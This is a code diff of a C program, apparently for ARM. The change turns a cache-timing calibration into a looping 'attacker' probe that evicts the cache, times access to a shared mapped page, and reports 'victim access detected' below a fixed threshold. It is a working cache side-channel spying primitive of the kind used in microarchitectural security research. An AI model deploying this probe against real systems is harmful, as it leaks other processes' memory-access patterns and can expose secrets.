@@ -10,7 +10,7 @@ uint64_t rdtsc(void) {
 	return val; 
 }
 
-#define EVICT_SIZE (32*1024*1024)
+#define EVICT_SIZE (1024*1024*1024)
 uint8_t evict_buffer[EVICT_SIZE];
 
 void evict_target(void) {
@@ -18,7 +18,6 @@ void evict_target(void) {
 	for (int i=0; i<EVICT_SIZE; i++) {
 		sum += evict_buffer[i];
 	}
-	printf("\n");
 }
 
 int main(void) {
@@ -29,28 +28,26 @@ int main(void) {
 
 	uint64_t start, end, t_hit, t_miss;
 
-	evict_target();
-	volatile uint8_t dummy = addr[0];
-	start = rdtsc(); 
-	asm volatile("isb; dsb sy");
-	dummy = addr[0];
-	asm volatile("isb; dsb sy");
-	end = rdtsc();
-	t_hit = end - start;
-
-	evict_target();
-	start = rdtsc();
-	asm volatile("isb; dsb sy");
-	dummy = addr[0];
-	asm volatile("isb; dsb sy");
-	end = rdtsc();
-	t_miss = end - start;
-
-	printf("cache hit time: %lu cycles\n", t_hit);
-	printf("cache miss time: %lu cycles\n", t_miss);
-
-	printf("threshold: %lu cycles\n", (t_hit + t_miss) / 2);
+	uint64_t threshold = 6;
+	uint64_t diff = 0;
+	printf("attacker started scanning with threshold: %lu..\n", threshold);
+	while(1) {
+		evict_target();
 		
+		printf("sleep check. Previous diff: %lu\n", diff);		
+		usleep(1000);
+
+		uint64_t start = rdtsc();
+		asm volatile ("isb; dsb sy");
+		volatile uint8_t dummy = addr[0];
+		asm volatile ("isb; dsb sy");
+		uint64_t end = rdtsc();
+		diff = end - start;
+		
+		if (diff < threshold) {
+			printf("victim access detected. time: %li\n", diff);
+		}
+	}
 	munmap(addr, 4096);
 	close(fd);
 	return 0;
